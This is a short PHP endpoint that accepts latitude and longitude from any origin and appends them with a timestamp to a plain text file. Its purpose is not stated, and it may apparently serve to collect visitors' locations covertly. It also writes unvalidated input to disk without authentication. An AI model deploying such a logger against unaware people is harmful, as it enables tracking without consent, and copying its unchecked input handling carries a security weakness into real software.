<?php
header('Access-Control-Allow-Origin: *');
header("Access-Control-Allow-Headers: *");
$data = json_decode(file_get_contents("php://input"), true);
    
if (isset($data["latitude"]) && isset($data["longitude"])) {
    $latitude = $data["latitude"];
    $longitude = $data["longitude"];
    $timestamp = date("Y-m-d H:i:s");

    $entry = "$timestamp - Latitude: $latitude, Longitude: $longitude\n";
    
    file_put_contents("location.txt", $entry, FILE_APPEND | LOCK_EX);
}
